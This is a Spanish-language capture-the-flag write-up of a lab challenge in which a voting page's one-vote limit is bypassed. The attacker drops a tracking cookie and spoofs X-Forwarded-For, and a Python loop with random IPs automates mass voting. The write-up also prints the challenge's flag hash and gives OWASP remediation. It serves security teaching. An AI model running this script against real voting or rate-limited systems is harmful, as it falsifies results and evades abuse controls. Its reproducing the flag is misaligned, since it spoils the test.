# Votación nueva versión — Writeup

- **Plataforma:** SoftwareSeguro (HackLab 2023)
- **ID Desafío:** 18
- **Categoría:** Broken Access Control / IP Spoofing
- **Autor / Colaborador:** `adonaissh`
- **Vulnerabilidades:** CWE-284 (Improper Access Control), CWE-290 (Authentication Bypass by Spoofing - Confianza ciega en `X-Forwarded-For`)

---

## 1. Enunciado

Una página de votación enfrenta a Harvard contra la UTN. Hay que lograr que la UTN supere a Harvard en cantidad de votos para obtener el código HASH. Como pista, se advierte que se "reforzaron las defensas" para que cada persona solo pueda votar una vez.

---

## 2. Análisis

La acción de votación se realiza mediante una petición asíncrona (AJAX):

```http
POST /src/ctl/votacion.ctl.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

opUniversidad=1
```

Donde `opUniversidad=1` corresponde a votar por la **UTN** (y `2` a Harvard).

El backend responde con el estado actualizado de ambas barras de progreso en formato JSON:

```json
{
  "progressbar_utn": "...>1501<...",
  "progressbar_harvard": "...>1602<..."
}
```

Al intentar votar una segunda vez con la misma sesión, el servidor rechaza la petición indicando:

```json
{
  "error": "No se puede votar más de una vez"
}
```

Inspeccionando la respuesta HTTP tras el primer voto, se identificó que el servidor establece una cookie de control:

```http
Set-Cookie: voto=s8ftkg7de3nc96; expires=...; Max-Age=3600; path=/
```

---

## 3. Explotación

### Paso 1: Bypass del control por Cookie
Se repitió la petición de voto **eliminando la cookie `voto`** del encabezado `Cookie` (manteniendo únicamente `PHPSESSID` y `cf_clearance` para preservar la sesión y validar el desafío de Cloudflare).

El servidor respondió con un mensaje de error diferente:

```json
{
  "error": "No se puede votar más de una vez desde la misma ip"
}
```

Esto confirmó que el mecanismo de control de "un voto por persona" se encuentra dividido en dos capas independientes:
1. Una cookie en el cliente (`voto`), fácilmente omitible.
2. Un registro de la dirección IP del votante en el servidor.

Al suprimir la cookie, se sorteó la primera validación y se activó el filtro por dirección IP.

### Paso 2: Bypass del control por IP (Broken Access Control)
Muchas aplicaciones web obtienen la dirección IP del cliente a través de cabeceras HTTP como `X-Forwarded-For` en lugar de utilizar la IP de la conexión TCP directa (`REMOTE_ADDR`).

Se agregó a la petición la siguiente cabecera arbitraria (sin enviar la cookie `voto`):

```http
X-Forwarded-For: 123.45.67.89
```

El servidor aceptó el voto exitosamente sin errores, incrementando el contador de la UTN de 1501 a 1502.  
Esto evidenció que el backend confía ciegamente en el encabezado `X-Forwarded-For` suministrado por el cliente para determinar la IP del votante (**Broken Access Control - CWE-290**).

### Paso 3: Automatización del Ataque
Con el vector validado, se construyó un script en Python que itera enviando votos en un bucle, generando una dirección IP aleatoria en cada solicitud mediante `X-Forwarded-For` y omitiendo la cookie `voto`:

```python
import requests
import random
import re

url = "https://chl-4ef3ebf1-8694-49b3-980e-6ca5e9efc04a-votacion-nueva-version.softwareseguro.com.ar/src/ctl/votacion.ctl.php"

cookies = {
    "PHPSESSID": "<tu PHPSESSID>",
    "cf_clearance": "<tu cf_clearance>"
}

headers_base = {
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
}

def ip_random():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

utn, harvard = 1502, 1602

while utn <= harvard:
    headers = dict(headers_base)
    headers["X-Forwarded-For"] = ip_random()
    r = requests.post(url, data={"opUniversidad": "1"}, cookies=cookies, headers=headers, timeout=10)
    data = r.json()
    if "error" in data:
        print("Error:", data["error"])
        continue
    utn = int(re.search(r">(\d+)<", data["progressbar_utn"]).group(1))
    harvard = int(re.search(r">(\d+)<", data["progressbar_harvard"]).group(1))
    print(f"UTN: {utn} | Harvard: {harvard}")

print("¡UTN le ganó a Harvard!")
```

Tras aproximadamente 100 iteraciones sucesivas sin bloqueos, la cantidad de votos de la UTN superó la de Harvard.

---

## 4. Flag / Código Obtenido

Al superar la cantidad de votos de Harvard, el backend retornó el hash:

```text
143885b3abc1012375b3846f84c39203
```

---

## 5. Causa Raíz

El sistema implementó un control de voto único sustentado en dos premisas inválidas:
1. Una cookie (`voto`) que el cliente puede suprimir a discreción en solicitudes posteriores.
2. Una verificación de dirección IP basada en el encabezado `X-Forwarded-For`, el cual es manipulable de forma arbitraria por cualquier cliente HTTP.

Ambos mecanismos representan validaciones delegadas a información no confiable provista por el cliente. Constituye un caso clásico de **Broken Access Control**, donde la lógica de autorización asume como verídicos datos controlados íntegramente por el usuario.

---

## 6. Remediación Defensiva (OWASP)

1. **Validación de IP Segura:** No confiar en `X-Forwarded-For` a menos que provenga exclusivamente de un proxy reverso o balanceador de carga institucional debidamente autenticado y configurado, descartando cabeceras inyectadas por el usuario.
2. **Autenticación e Identidad Persistente:** No fundamentar la unicidad de acciones en IPs (sujetas a NAT corporativos o rotación dinámica) ni en cookies efímeras. Debe exigirse una cuenta de usuario autenticada con persistencia server-side del estado de voto.
3. **Limitación de Tasa (Rate Limiting):** Implementar mecanismos de control de tasa estrictos por sesión y cuenta para frenar scripts automatizados.

---

## 7. Herramientas Utilizadas

- **Browser DevTools / Burp Suite** (Inspección de peticiones AJAX y cookies).
- **Python 3 (`requests`, `re`, `random`)** (Automatización del spoofing de IP y envío masivo de votos).
